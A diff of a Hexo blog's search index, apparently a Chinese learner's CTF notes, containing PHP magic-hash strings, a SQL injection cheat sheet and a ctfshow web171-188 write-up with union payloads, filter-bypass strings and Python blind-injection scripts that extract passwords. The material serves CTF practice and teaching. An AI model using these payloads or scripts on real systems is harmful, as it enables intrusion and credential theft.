+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br><span class="line"> sha1(str)</span><br><span class="line">sha1(<span class="string">&#x27;aaroZmOk&#x27;</span>)  </span><br><span class="line">sha1(<span class="string">&#x27;aaK1STfY&#x27;</span>)</span><br><span class="line">sha1(<span class="string">&#x27;aaO8zKZF&#x27;</span>)</span><br><span class="line">sha1(<span class="string">&#x27;aa3OFF9m&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="优先级问题"><a href="#优先级问题" class="headerlink" title="优先级问题"></a>优先级问题</h3><p>and 和 &amp;&amp; 都表示逻辑与，or 和 || 都表示逻辑或，但是优先级不同，&amp;&amp; &gt; ‘=’ &gt; and，|| &gt; ‘=’ &gt; or。</p>
+<p>tips: 注意and 和 = 的位置。</p>
+<h3 id="php原生类"><a href="#php原生类" class="headerlink" title="php原生类"></a>php原生类</h3><h4 id="ReflectionClass"><a href="#ReflectionClass" class="headerlink" title="ReflectionClass"></a>ReflectionClass</h4><p>可以显示出一个类的相关信息。</p>
+<h4 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h4><p>可以获取指定目录下的所有文件。</p>
+<h3 id="字符串解析"><a href="#字符串解析" class="headerlink" title="字符串解析"></a>字符串解析</h3><p>php在解析查询字符串时，会删除空白符，或将某些字符转换为下划线（包括空格）</p>
+<p><a href="https://www.freebuf.com/articles/web/213359.html">具体bypass看这</a></p>
+<h3 id="逻辑与或运算判断"><a href="#逻辑与或运算判断" class="headerlink" title="逻辑与或运算判断"></a>逻辑与或运算判断</h3><blockquote>
+<p>对于“与”（&amp;&amp;） 运算： x &amp;&amp; y 当x为false时，直接跳过，不执行y； 对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y。</p>
+</blockquote>
 ]]></content>
       <categories>
-        <category>sql注入</category>
+        <category>Web</category>
       </categories>
       <tags>
-        <tag>sql注入</tag>
-        <tag>mysql</tag>
+        <tag>PHP</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
-    <title>sql注入基本语句</title>
-    <url>/2021/02/05/sql/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E8%AF%AD%E5%8F%A5/</url>
-    <content><![CDATA[<h1 id="sql注入基本语句"><a href="#sql注入基本语句" class="headerlink" title="sql注入基本语句"></a>sql注入基本语句</h1><a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order by 4 -- -</span><br><span class="line">判断有多少列</span><br><span class="line">union select 1,2,3 -- -</span><br><span class="line">判断数据显示点</span><br><span class="line">union select 1,user(),database()­­ -- -</span><br><span class="line">显示出登录用户和数据库名</span><br><span class="line">union select 1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; &#39;security&#39; ),3 -- -</span><br><span class="line">查看数据库有哪些表</span><br><span class="line">union select 1,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; &#39;security&#39; and table_name&#x3D;&#39;users&#39; ),3 -- -</span><br><span class="line">查看对应表有哪些列</span><br><span class="line">union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 -- -</span><br><span class="line">查看账号密码信息</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-        <tag>mysql</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>模板注入(SSTI)的简单总结</title>
-    <url>/2021/03/26/web%E5%AD%A6%E4%B9%A0/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
+    <title>SSTI小总结</title>
+    <url>/2021/03/26/web%E5%AD%A6%E4%B9%A0/SSTI%E5%B0%8F%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h1 id="模板注入-SSTI-的简单总结"><a href="#模板注入-SSTI-的简单总结" class="headerlink" title="模板注入(SSTI)的简单总结"></a>模板注入(SSTI)的简单总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于现在还是萌新时期，这时候决定先写一篇关于模板注入的简单总结给自己用。</p>
 <h2 id="SSTI的简单测试"><a href="#SSTI的简单测试" class="headerlink" title="SSTI的简单测试"></a>SSTI的简单测试</h2><p><img src="https://i.loli.net/2021/03/25/uwZaFe4Tx8MR6DG.png"></p>
 <h2 id="各框架的模板结构"><a href="#各框架的模板结构" class="headerlink" title="各框架的模板结构"></a>各框架的模板结构</h2><p><img src="https://i.loli.net/2021/03/25/fRsgd7tD6mQNHyB.png"></p>
@@ -504,7 +341,7 @@
 <p><a href="https://blog.csdn.net/qq_45521281/article/details/107556915?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161812604616780261937076%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161812604616780261937076&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-107556915.first_rank_v2_pc_rank_v29&amp;utm_term=smarty%E6%B3%A8%E5%85%A5">https://blog.csdn.net/qq_45521281/article/details/107556915?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161812604616780261937076%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161812604616780261937076&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-107556915.first_rank_v2_pc_rank_v29&amp;utm_term=smarty%E6%B3%A8%E5%85%A5</a></p>
 ]]></content>
       <categories>
-        <category>Web学习</category>
+        <category>Web</category>
       </categories>
       <tags>
         <tag>CTF</tag>
@@ -513,8 +350,91 @@
       </tags>
   </entry>
   <entry>
-    <title>命令注入知识点总结</title>
-    <url>/2021/03/29/web%E5%AD%A6%E4%B9%A0/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
+    <title>CTFshow web入门 sql</title>
+    <url>/2021/02/09/web%E5%AD%A6%E4%B9%A0/ctfshow%20SQL/</url>
+    <content><![CDATA[<h1 id="ctfshow-SQL"><a href="#ctfshow-SQL" class="headerlink" title="ctfshow SQL"></a>ctfshow SQL</h1><p>刷一刷ctfshow的sql题，提升一下sql方面的缺陷</p>
+<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>进入后题目给出了sql注入的语句</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;</span><br></pre></td></tr></table></figure>
+<p>构造一下payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 4 %23 # 查询列数</span><br><span class="line">-1&#39; union select 1,2,3 %23 # 查回显点</span><br><span class="line">-1&#39; union select 1,database(),3 %23 # 爆库名</span><br><span class="line">-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),3 %23 # 爆表名</span><br><span class="line">-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user&#39;),3 %23 # 爆列名</span><br><span class="line">-1&#39; union select 1,(select group_concat(username,0x7e,password) from ctfshow_user),3 %23 # 爆数据</span><br></pre></td></tr></table></figure>
+<p>最后得到flag</p>
+<blockquote>
+<p>ctfshow{50392f35-7412-4264-833f-ae36542013f0}</p>
+</blockquote>
+<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>进入题目就看到一只可爱的小猫在晃，小猫咪虽然很可爱，但是还是得先写题</p>
+<p>进到select模块的无过滤注入2</p>
+<p>跟上题一样，但是回显点变为了两个</p>
+<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>这题也跟171一样，但是返回结果那过滤了flag</p>
+<p>也很简单，我们只需要去掉username的查询就好了，因为flag在username里</p>
+<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>测试了几下发现没数据，抓包发现了一个奇怪的网址</p>
+<p><a href="http://0587e034-2714-4282-bc5a-d4809dad6807.challenge.ctf.show:8080/api/v4.php?id=1">http://0587e034-2714-4282-bc5a-d4809dad6807.challenge.ctf.show:8080/api/v4.php?id=1</a></p>
+<p>有回显了，但是不是我们想要的，用盲注整整</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="string">&quot;url_here?id=1&#x27; and &quot;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;[*] StartAttack&quot;</span>)</span><br><span class="line">    left_base = <span class="number">32</span></span><br><span class="line">    right_base = <span class="number">128</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        left = left_base</span><br><span class="line">        right = right_base</span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">            datasql = <span class="string">f&#x27;if(ascii(substr((select password from ctfshow_user4 limit 24, 1),<span class="subst">&#123;x&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0) %23&#x27;</span></span><br><span class="line">            response = requests.get(url+datasql)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="comment"># print(f&quot;[+] left=&#123;left&#125;, right=&#123;right&#125;&quot;)</span></span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right) / <span class="number">2</span>))</span><br><span class="line">        print(<span class="string">f&quot;[*] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[+] EndAttack!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><p>这次没回显了，试试时间盲注</p>
+<p>这里是代码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="string">&quot;url_here?id=1&#x27; and &quot;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;[*] StartAttack&quot;</span>)</span><br><span class="line">    left_base = <span class="number">32</span></span><br><span class="line">    right_base = <span class="number">128</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        left = left_base</span><br><span class="line">        right = right_base</span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">            startTime = time.time()</span><br><span class="line">            datasql = <span class="string">f&#x27;if(ascii(substr((select password from ctfshow_user5 limit 24, 1),<span class="subst">&#123;x&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0)%23&#x27;</span></span><br><span class="line">            response = requests.get(url+datasql)</span><br><span class="line">            endTime = time.time()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.get(url+datasql, timeout=<span class="number">0.5</span>)</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="comment"># print(f&quot;[+] left=&#123;left&#125;, right=&#123;right&#125;&quot;)</span></span><br><span class="line">        <span class="keyword">if</span> left != <span class="number">32</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right) / <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        print(<span class="string">f&quot;[*] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[+] EndAttack!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>这题简单的过滤了一下关键字，把select过滤了，但是没事</p>
+<p>试试大写绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">999&#39; union Select 1,2,3 %23 # 成功得到回显</span><br><span class="line">999&#39; union Select 1,(Select group_concat(username,0x7e,password) From ctfshow_user),3%23 # 爆出flag</span><br></pre></td></tr></table></figure>
+<h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p>这题过滤了空格，用/**/绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">999&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(username,0x7e,password)&#x2F;**&#x2F;From&#x2F;**&#x2F;ctfshow_user),3%23 # 爆出flag</span><br></pre></td></tr></table></figure>
+<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>过滤了空格和*号，转用%09绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">999&#39;%09union%09Select%091,(Select%09group_concat(username,0x7e,password)%09From%09ctfshow_user),3%23 # 爆出flag</span><br></pre></td></tr></table></figure>
+<p>后面发现，其实还可以这样写</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;or&#39;1&#39;&#x3D;&#39;1&#39;%23 # 非预期解</span><br></pre></td></tr></table></figure>
+<h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><p>这题把%09也给过滤了，但是还有多种姿势</p>
+<h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>可以用上面的非预期直接一把梭</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;or&#39;1&#39;&#x3D;&#39;1&#39;%23 # 非预期解</span><br></pre></td></tr></table></figure>
+<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>用%0c绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;%0cor%0c1&#x3D;1%23</span><br></pre></td></tr></table></figure>
+<h3 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h3><p>用()绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;or(1&#x3D;1)%23</span><br></pre></td></tr></table></figure>
+<h2 id="web180-182"><a href="#web180-182" class="headerlink" title="web180-182"></a>web180-182</h2><p>把大部分空格都过滤掉了（180还把%23也过滤了</p>
+<p>这里采用Y4师傅的解法</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;or(id&#x3D;26)and&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+<p>解释一下就是</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;or(id&#x3D;26)and&#39;1&#39;&#x3D;&#39;1 # 输入进去之后</span><br><span class="line"># sql请求语句</span><br><span class="line">where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&#39;or(id&#x3D;26)and&#39;1&#39;&#x3D;&#39;1&#39;</span><br><span class="line"># 因为and的优先级比or大，所以相当于</span><br><span class="line">where (username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&#39;) or (id&#x3D;26and&#39;1&#39;&#x3D;&#39;1&#39;)</span><br><span class="line"># 因为or左边为false，但是右边为true，所以where的条件为true</span><br><span class="line"># tips：id&#x3D;26正好还是flag的元组，实在是太女少了</span><br></pre></td></tr></table></figure>
+<h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>输入ctfshow_user发现有回显，而且where可控</p>
+<p>整个盲注脚本跑出flag</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">f&quot;(ctfshow_user)where(pass)like&#x27;<span class="subst">&#123;result+j&#125;</span>%&#x27;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
+<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><p>这题过滤了更多的东西，把where也过滤了，但是把空格放出来了</p>
+<p>这里查到了两种解法</p>
+<h3 id="解法一-1"><a href="#解法一-1" class="headerlink" title="解法一"></a>解法一</h3><p>解法一是参照Y4师傅的用right by进行查询</p>
+<p>这里是盲注脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;0x&quot;</span>+str_to_hex(result+j+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 43;&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
+<h3 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h3><p>因为count是聚合函数，所以也可以用group by，having来查询</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user group by pass having pass like &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;0x&quot;</span>+str_to_hex(result+j+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
+<h2 id="web185-186"><a href="#web185-186" class="headerlink" title="web185-186"></a>web185-186</h2><p>这题过滤了更多的东西，甚至把数字都过滤了_(¦3」∠)_</p>
+<p>去搜了搜，在Y4师傅那里发现了一张图</p>
+<p><img src="https://i.loli.net/2021/04/06/qQS6KvFXDW41uki.png"></p>
+<p>发现可以上true</p>
+<p>这里是脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Num</span>(<span class="params">n</span>):</span></span><br><span class="line">    num = <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Numstr</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">str</span> += <span class="string">&quot;chr(&quot;</span>+Num(<span class="built_in">ord</span>(s[<span class="number">0</span>]))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;,chr(&quot;</span>+Num(<span class="built_in">ord</span>(i))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user group by pass having pass like(concat(&#123;&#125;))&quot;</span>.<span class="built_in">format</span>(Numstr(result+j+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 0;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
+<h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>绕过md5($str,true)，直接用户名填写<code>admin</code>密码为<code>ffifdyop</code></p>
+<p>原理的话在这里<a href="https://blog.csdn.net/solitudi/article/details/107813286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160631731619195283021913%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160631731619195283021913&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107813286.pc_v2_rank_blog_default&utm_term=md5%20%20_POST%20%20password%20%20,true&spm=1018.2118.3001.4450">[SQL绕过]md5($str,true)类型绕过</a></p>
+<p>然后F12抓个包就可以看到flag了</p>
+<p><img src="https://i.loli.net/2021/04/06/cLivMjtPBDVw5au.png"></p>
+<h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><p>这题是纯知识盲区∑(っ°Д°;)っ</p>
+<p>咱们可以这样子</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">username=<span class="number">0</span>&amp;password=<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>为什么呢↓</p>
+<p>在sql查询时，<code>where username=0</code>这样的查询中，因为数据库里的<code>username</code>都会是字符串，而在<strong>mysql</strong>中字符串与数字进行比较的时候，以字母开头的字符串都会转换成数字0，因此这个<code>where</code>条件可以把所有以字母开头的数据查出来</p>
+<p>而<code>passwor=0</code>则是因为</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==intval(<span class="variable">$password</span>) <span class="comment"># 弱类型比较</span></span><br><span class="line"><span class="comment"># 因为pass查出来的数据也会是以字母开头的，所有password=0可以利用弱类型比较得到flag</span></span><br></pre></td></tr></table></figure>
+<p>而这样也可以把东西查出来</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">username=<span class="number">1</span>&lt;<span class="number">1</span>&amp;password=<span class="number">0</span></span><br><span class="line">username=<span class="number">1</span>||<span class="number">1</span>&amp;password=<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2>]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>命令注入小总结</title>
+    <url>/2021/03/29/web%E5%AD%A6%E4%B9%A0/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%B0%8F%E6%80%BB%E7%BB%93/</url>
